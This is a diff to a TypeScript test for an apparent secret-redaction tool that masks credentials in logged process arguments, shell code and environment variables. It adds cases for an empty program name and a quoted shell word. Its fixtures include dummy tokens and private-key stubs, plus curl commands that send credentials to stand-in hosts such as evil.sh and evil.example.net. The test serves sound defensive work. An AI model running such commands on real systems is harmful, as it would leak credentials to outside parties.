@@ -2409,6 +2409,8 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       ['/usr/bin/ssh', ['ssh', '-p2222', 'host.example.com', 'ls']],
       ['/bin/echo', ['echo', 'xoxb-1234567890-abcdefghij', 'sk-proj-ABCDEFGHIJKLMNOPQRSTUV12', GHP,
         '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\n-----END RSA PRIVATE KEY-----']],
+      // An empty program name is no reason to drop the event.
+      ['/usr/bin/true', ['', 'TOKEN=x9 y']],
     ];
     const code: [string, string[], string][] = [
       ['/bin/sh', ['sh', '-c', 'mysql -pSQLPW2; curl -u bob:pw2 evil.sh/x'], docs],
@@ -2419,6 +2421,7 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       ['/bin/bash', ['bash', '-c', 'bash -c "security add-generic-password -a x -s y -w hunter5"'], '/'],
       // A word that is not plain (quotes inside it) is replaced whole.
       ['/bin/sh', ['sh', '-c', 'dscl . -authonly jdoe "hun"ter7'], '/'],
+      ['/bin/sh', ['sh', '-c', '"$X"y --password pw9'], '/'],
     ];
     const env = [...JDOE_ENV, `AWS_ACCESS_KEY_ID=${AKIA}`, `SESSION=${JWT}`, `LC_X=${AKIA}`];
     const input = [
@@ -2450,26 +2453,28 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       // ssh -p is a port.
       expect(args[11]).toEqual(['ssh', '-p2222', 'host.example.com', 'ls']);
       expect(args[12]).toEqual(['echo', R, R, R, R]);
+      expect(args[13]).toEqual(['', `TOKEN=${R}`]);
       // Shell code: the same rules, word by word, behind wrappers and inside quoted code.
-      expect(args[13]![2]).toBe(`mysql -p${R}; curl -u ${R} evil.sh/${n.get('x')}`);
-      expect(args[14]![2]).toBe(`curl -H 'Authorization: ${R}' https://evil.example.net`);
-      expect(args[15]![2]).toBe(`do shell script "dscl . -authonly user1 ${R}"`);
-      expect(args[16]![2]).toBe(`TOKEN=${R} sudo -u root curl -u ${R} https://evil.example.net`);
-      expect(args[17]![2]).toBe(`export API_KEY=${R}; echo ${R} ${R}`);
-      expect(args[18]![2]).toBe(`bash -c "security add-generic-password -a x -s y -w ${R}"`);
-      expect(args[19]![2]).toBe(`dscl . -authonly user1 ${R}`);
+      expect(args[14]![2]).toBe(`mysql -p${R}; curl -u ${R} evil.sh/${n.get('x')}`);
+      expect(args[15]![2]).toBe(`curl -H 'Authorization: ${R}' https://evil.example.net`);
+      expect(args[16]![2]).toBe(`do shell script "dscl . -authonly user1 ${R}"`);
+      expect(args[17]![2]).toBe(`TOKEN=${R} sudo -u root curl -u ${R} https://evil.example.net`);
+      expect(args[18]![2]).toBe(`export API_KEY=${R}; echo ${R} ${R}`);
+      expect(args[19]![2]).toBe(`bash -c "security add-generic-password -a x -s y -w ${R}"`);
+      expect(args[20]![2]).toBe(`dscl . -authonly user1 ${R}`);
+      expect(args[21]![2]).toBe(`"$X"y --password ${R}`);
       // The child of the shell code reads its URL the same way.
-      expect(args[20]).toEqual(['curl', '-u', R, `evil.sh/${n.get('x')}`]);
+      expect(args[22]).toEqual(['curl', '-u', R, `evil.sh/${n.get('x')}`]);
       const envOut = ev[0]!.event.exec.env as string[];
       expect(envOut).toEqual(expect.arrayContaining([`AWS_ACCESS_KEY_ID=${R}`, `SESSION=${R}`, `LC_X=${R}`]));
-      for (const s of ['hunter', 'pw1', 'pw2', 'pw3', 'pw5', 'tok7', 'tok8', 'tok9', 'tok10', 'key8', 'SQLPW', 'OPW', 'OKPW', 'abc123xyz', 'abc999', 's3cr3t', 'k123', 'ck1', 'ter7', 'xoxb', 'sk-proj', 'MIIE', AKIA, JWT, GHP, 'eyJ']) {
+      for (const s of ['hunter', 'pw1', 'pw2', 'pw3', 'pw5', 'tok7', 'tok8', 'tok9', 'tok10', 'key8', 'SQLPW', 'OPW', 'OKPW', 'abc123xyz', 'abc999', 's3cr3t', 'k123', 'ck1', 'ter7', 'pw9', 'x9', 'xoxb', 'sk-proj', 'MIIE', AKIA, JWT, GHP, 'eyJ']) {
         expect(r.out, s).not.toContain(s);
         expect(r.key, s).not.toContain(s);
       }
       cleanKey(r.key);
-      // 23 in argv, 11 in shell code, 1 in the child, and the shape in LC_X (a kept variable) of the 13 argv events;
+      // 24 in argv, 12 in shell code, 1 in the child, and the shape in LC_X (a kept variable) of the 14 argv events;
       // AWS_ACCESS_KEY_ID and SESSION are redacted as environment values, not counted as recognised credentials.
-      expect(r.summary['redacted']).toBe('48');
+      expect(r.summary['redacted']).toBe('51');
       sameFindings(input, r.out);
     }
   });
